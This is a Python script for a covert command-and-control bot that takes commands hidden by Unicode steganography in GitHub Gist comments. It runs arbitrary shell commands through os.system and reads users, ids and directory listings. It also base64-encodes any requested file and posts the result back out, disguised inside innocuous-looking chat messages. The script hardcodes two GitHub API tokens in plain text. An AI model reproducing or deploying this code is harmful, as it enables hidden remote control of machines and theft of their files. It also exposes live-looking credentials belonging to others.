from simplegist import Simplegist
import time, random, os, tqdm, socket, threading
import base64
import pyUnicodeSteganography as usteg
GHgistController = Simplegist(username='jirikdan', api_token='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')
GhgistBot = Simplegist(username='TheQfr', api_token='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')
comments = GHgistController.comments().listall(name='secret.txt')
commentsNumber = len(comments)


botIsAliveAnswers = ["Ye, im there", "No, I am soo booored", "Hmm someone is bored :P"]
botRandomMessage = ["What a nice day, im just here sitting programming nothing interestin really its really cool and fine. What about you guys are you up to something interesting? Or are you just doing nothing" , "Im feeling like a hero today, I was in the gym I had the greatest lunch and now im on my beloved gist talking to my beloved friends. Could it get even better? I do not think so its perfect already"]
botIsAliveQuestions = ["Im so bored, you there?", "I wanna talk, but noone is there to talk, or mby?", "Any1 up for some Fortnite?"]
controllerQuestions = botIsAliveQuestions


def convert_to_plain_text(file_path):
    try:
        with open(file_path, 'rb') as file:
            binary_data = file.read()
        plain_text = base64.b64encode(binary_data).decode('utf-8')
        return plain_text
    except:
        return "No such file exists"

def handleCommands(command):
    fakeMessage = random.choice(botRandomMessage)
    command = usteg.decode(command)
    if command == "Hey":
        GhgistBot.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body='Yo')
    if command in botIsAliveQuestions:
        GhgistBot.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=random.choice(botIsAliveAnswers))
    if command.startswith("w"):
        sendStr = os.popen("who | cut -d' ' -f1").read()
        if sendStr == "":
            sendStr = "Noone is UP"
        try:
            sendStr = usteg.encode(fakeMessage, sendStr)
        except:
            sendStr = usteg.encode(fakeMessage, "Encryption failed")
        GhgistBot.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=sendStr)
    if command.startswith("ls"):
        sendStr = os.popen(command).read()
        if sendStr == "":
            sendStr = "There are no files in specified directory"
        try:
            sendStr = usteg.encode(fakeMessage, sendStr)
        except:
            sendStr = usteg.encode(fakeMessage, "Encryption failed")
        GhgistBot.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=sendStr)
    if command.startswith("copy"):
        sendStr = convert_to_plain_text(command[5:])
        sendStr = usteg.encode(fakeMessage, sendStr)
        GhgistBot.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=sendStr)
    if command.startswith("execute"):
        os.system(command[8:])
        sendStr = command[8:] + " was executed"
        sendStr = usteg.encode(fakeMessage, sendStr)
        GhgistBot.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=sendStr)
    if command.startswith("id"):
        sendStr = os.popen("id").read()
        try:
            sendStr = usteg.encode(fakeMessage, sendStr)
        except:
            sendStr = usteg.encode(fakeMessage, "Encryption failed")
        GhgistBot.comments().create(id='8b1ad9484c7acb95f0a72d4c6ece1f06', body=sendStr)
        

while(True):
    currComments = GHgistController.comments().listall(name='secret.txt')
    currCommentsNumber = len(currComments)
    if currCommentsNumber != commentsNumber:
        commentsDiff = currCommentsNumber - commentsNumber
        for i in range(0,commentsDiff):
            ## Handling command
            handleCommands(currComments[len(currComments)-1 - i])
        commentsNumber = currCommentsNumber
    time.sleep(2)